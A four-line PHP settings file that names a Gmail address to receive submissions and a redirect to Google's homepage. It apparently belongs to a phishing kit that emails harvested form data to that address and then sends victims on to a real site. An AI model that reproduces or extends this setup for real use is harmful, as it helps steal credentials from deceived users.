<?php 
$Receive_email="adil.ahmad10121@gmail.com";
$redirect="https://www.google.com/";
?>